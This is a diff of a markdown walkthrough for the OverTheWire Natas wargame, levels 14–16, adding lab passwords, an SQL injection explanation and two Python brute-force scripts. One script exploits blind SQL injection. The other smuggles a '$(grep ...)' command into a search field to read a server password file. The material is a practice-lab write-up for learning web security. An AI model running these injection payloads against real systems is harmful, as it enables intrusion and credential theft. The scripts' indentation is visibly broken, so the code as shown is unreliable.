@@ -269,18 +269,18 @@
   
 - Step 7: It has XOR encoded data. So, We will find the key. So, use online php , Then write php code.
 -
--     php
--     <html>
--     <body>
+-        php
+-        <html>
+-        <body>
 
--     <?php
+-         <?php
 
--     $xor_encrypted_text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
--     $variable = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
--     $original_text = json_encode($variable);
+-         $xor_encrypted_text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
+-         $variable = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+-         $original_text = json_encode($variable);
 
--     function xor_encrypt($a, $b) {
-  -     $outText = '';
+-         function xor_encrypt($a, $b) {
+  -       $outText = '';
 
    -     for ($i = 0; $i < strlen($a); $i++) {
     -     $outText .= $a[$i] ^ $b[$i];
@@ -408,6 +408,174 @@
  - Step 9: It shows like this, Then click on that link, navigate to Burpsuite then click forward
 
    <img width="825" height="485" alt="image" src="https://github.com/user-attachments/assets/9196bdbc-fa22-4c4c-b7c4-e736a6991e96" />
+
+
+- ## Level - 14
+- Username : natas14
+- Password : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+- Domain : http://natas14.natas.labs.overthewire.org
+- Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas14.natas.labs.overthewire.org, Then login with username and password
+- step 2:  Then click view source code & once read that code
+- Step 3: Then you will OR operation , to find the password, Then click on that Login.
+- OR Explanation :
+- "OR" is a logical operator in SQL that returns TRUE when at least one condition is true.
+- In Natas, it is used to show how unsafe user input can change login query behavior and demonstrate SQL Injection concepts.
+
+  
+<img width="1005" height="465" alt="image" src="https://github.com/user-attachments/assets/aa8ccb12-7549-463f-9645-a0af6e01e768" />
+
+- Step 4: Do not touch password block, enter in username block only, other wise it will show error
+- Step 5: Then you will see the password for level-15
+
+ <img width="935" height="373" alt="image" src="https://github.com/user-attachments/assets/3f8de308-5c1d-4601-a42c-a1d4d8ceb612" />
+
+
+- ## Level -15:
+- Username : natas15
+- Password : SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+- Domain : http://natas15.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas15.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Then click view source code
+  
+  <img width="988" height="721" alt="image" src="https://github.com/user-attachments/assets/d7c8a859-5db9-485b-8185-f30b28da05a6" />
+
+- Step 3: Then enter natas16 for chekcing the existing user or not
+
+<img width="942" height="397" alt="image" src="https://github.com/user-attachments/assets/fe6d043e-5787-46fb-9d49-45ce1ccb9838" />
+
+- step 4 : It shows the like this
+
+<img width="928" height="342" alt="image" src="https://github.com/user-attachments/assets/1b67f9a6-3561-4049-a691-d5af9ffd18f4" />
+
+- Step 5: Then you will use Blind SQL injection to get the password for level-16, By using the Brute force attack.
+
+- "This means Blind SQL Injection is used when the website does not show the password directly, so you identify correct information by checking the website’s response (true/false).
+
+- Brute force means trying many possible characters step by step until the correct password is discovered in the Natas practice lab."
+
+- Step 6: Write code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+- type this code in kali (nono)
+
+-     import requests
+      import re
+
+      characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+      username = 'natas15'
+      password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
+
+      url = 'http://natas15.natas.labs.overthewire.org'
+
+      session = requests.Session()
+      current_password = []
+
+      while True:
+      for character in characters:
+      print("Trying with: " + "".join(current_password) + character)
+
+      response = session.post(
+        url,
+        data={
+            "username": 'natas16" and password like binary "' +
+                        "".join(current_password) + character + '%" #'
+        },
+        auth=(username, password)
+      )
+
+        if "This user exists." in response.text:
+        current_password.append(character)
+        break
+
+      if len(current_password) == 32:
+       break
+
+- Step 7: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-16
+
+  <img width="447" height="578" alt="image" src="https://github.com/user-attachments/assets/af56dec1-ad02-4b71-8f41-f070f0f48c10" />
+
+- Step 8: Then you will see the password for level-16
+
+  <img width="521" height="680" alt="image" src="https://github.com/user-attachments/assets/6d58a763-85e4-48d6-b157-a2a66e022ba8" />
+
+- ## Level-16
+- Username : natas16
+- Password : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+- Domain : http://natas16.natas.labs.overthewire.org
+- ## Explanation
+  
+- Step 1: Go to Firefox Browser, Then Connect to natas16.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Then click view source code
+- <img width="1192" height="662" alt="image" src="https://github.com/user-attachments/assets/fd6d7fbf-cebf-48b4-aa42-c5104a6b8f9e" />
+
+- Step 3: Then write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+- here the code
+
+-     import requests
+      from requests.auth import HTTPBasicAuth
+
+      username = 'natas16'
+      password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+
+       characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+      output = ''
+
+      url = 'http://natas16.natas.labs.overthewire.org'
+
+      for i in range(32):
+      for j in characters:
+         command = f"^$(grep -o ^{output+j} /etc/natas_webpass/natas17)A"
+         payload = {
+        'needle': command,
+        'submit': 'Search'
+          }
+
+        # Use params for GET request
+          result = requests.get(
+           url,
+           auth=HTTPBasicAuth(username, password),
+            params=payload
+           )
+
+            str1 = result.text
+
+            start = str1.find('<pre>\n') + len('<pre>\n')
+             end = str1.find('\n</pre>')
+
+           if start != -1 and end != -1:
+              str2 = str1[start:end].split('\n')
+
+                 if str2 and str2[0] != 'African':
+                        output += j
+                        print(output)
+                        break
+
+      print("Final Output:", output)
+
+- Step 5: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-17
+
+- Step 6: It is slow process, That's why we need to have more patience to get the password for level-17
+
+<img width="690" height="765" alt="image" src="https://github.com/user-attachments/assets/d073fa0e-3711-4a42-950f-016dc782b53b" />
+ 
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
 
 
 
